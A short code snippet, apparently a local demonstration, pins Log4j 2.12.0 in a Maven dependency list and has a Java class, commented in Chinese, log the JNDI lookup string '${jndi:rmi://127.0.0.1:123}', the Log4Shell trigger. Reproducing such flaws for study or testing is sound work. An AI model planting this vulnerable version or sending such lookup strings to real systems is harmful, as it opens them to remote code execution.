```
<dependencies>
<dependency>
<groupId>org.apache.logging.log4j</groupId>
<artifactId>log4j-core</artifactId>
<version>2.12.0</version>
</dependency>

<dependency>
<groupId>org.apache.logging.log4j</groupId>
<artifactId>log4j-api</artifactId>
<version>2.12.0</version>
</dependency>
</dependencies>
```


```java
public class MyApp {
    // 创建一个日志记录器实例
    private static final Logger logger = LogManager.getLogger(MyApp.class);

    public static void main(String[] args) {
        // 使用日志记录器记录日志
        logger.info("这是一条信息级别的日志");
        logger.error("这是一条错误级别的日志");

        Logger logger1 = LogManager.getLogger();
        logger1.error("${jndi:rmi://127.0.0.1:123}");
    }
}
```

